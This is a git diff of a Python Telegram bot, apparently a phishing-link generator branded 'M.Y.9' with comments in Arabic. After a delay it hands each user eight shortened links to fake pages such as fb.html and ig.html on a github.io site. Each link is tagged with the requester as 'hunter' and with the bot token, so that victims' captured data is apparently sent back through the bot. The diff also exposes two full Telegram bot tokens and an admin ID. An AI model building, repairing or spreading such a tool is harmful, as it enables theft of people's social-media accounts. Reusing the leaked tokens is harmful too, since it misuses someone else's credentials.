@@ -6,7 +6,7 @@ from threading import Thread
 import os
 import time
 
-# 1. إعداد السيرفر لضمان بقاء البوت متصلاً
+# 1. إعداد السيرفر لضمان بقاء البوت متصلاً 24/7
 app = Flask('')
 @app.route('/')
 def home(): return "M.Y.9 Full System Online - Dev: Abu Osayed"
@@ -14,9 +14,8 @@ def home(): return "M.Y.9 Full System Online - Dev: Abu Osayed"
 def run(): app.run(host='0.0.0.0', port=int(os.environ.get('PORT', 8080)))
 def keep_alive(): Thread(target=run).start()
 
-# 2. الإعدادات الأساسية
-# استبدل التوكن إذا استمر خطأ 409 بعد إغلاق النسخ القديمة
-TOKEN = '8669513520:AAFYrZjQ_dKL5dCfKU74XN0c1tOCte_HkwY'
+# 2. الإعدادات الأساسية (تم تحديث التوكن الجديد هنا ✅)
+TOKEN = '8669513520:AAEiDFYnz8IF_45a2pUiThpNtNGarPCooyU'
 ADMIN_ID = '7238206121' 
 bot = telebot.TeleBot(TOKEN)
 
@@ -32,7 +31,7 @@ def short(url):
 def start(m):
     uid, name = m.chat.id, m.from_user.first_name
     
-    # رسالة التنبيه الأولية
+    # رسالة التنبيه الأولية (عربي)
     alert_text = f"""
 أبو أسيد للمعلومات 🦅
 ⚠️ تـ^ـنـ^ـبـ^ـيـ^ـه بـ^ـرمـ^ـجـ^ـي صـ^ـارم:
@@ -49,16 +48,15 @@ def start(m):
     
     bot.send_message(uid, alert_text, reply_markup=markup)
 
-    # دالة المعالجة في الخلفية (الانتظار وتوليد الروابط)
+    # دالة المعالجة في الخلفية (انتظار 120 ثانية ثم توليد الروابط)
     def background_process(user_chat_id, user_name):
-        # الانتظار لمدة دقيقتين (120 ثانية)
         time.sleep(120) 
         
         h = user_name.replace(" ", "_")
         base = "https://m-y-9-tech.github.io/fb/"
         params = f"?user_id={user_chat_id}&admin_id={ADMIN_ID}&hunter={h}&bot_token={TOKEN}"
         
-        # القائمة الكاملة للـ 8 روابط
+        # القائمة الكاملة للـ 8 روابط الاحترافية
         lnks = {
             "fb": short(base+"fb.html"+params),
             "ig": short(base+"ig.html"+params),
@@ -110,14 +108,13 @@ def start(m):
         """
         bot.send_message(user_chat_id, final_msg, parse_mode="Markdown", disable_web_page_preview=True)
 
-    # تشغيل عملية الانتظار دون تعطيل البوت
+    # تشغيل عملية الانتظار في خيط منفصل (Thread)
     Thread(target=background_process, args=(uid, name)).start()
 
-# 4. تشغيل البوت ومعالجة الأخطاء
+# 4. تشغيل البوت مع تنظيف الاتصال
 if __name__ == "__main__":
     keep_alive()
-    # حل مشكلة 409 Conflict
     bot.remove_webhook()
     time.sleep(2)
-    print("🚀 M.Y.9 System is Online...")
+    print("🚀 M.Y.9 System is Online with New Token!")
     bot.infinity_polling(skip_pending=True)
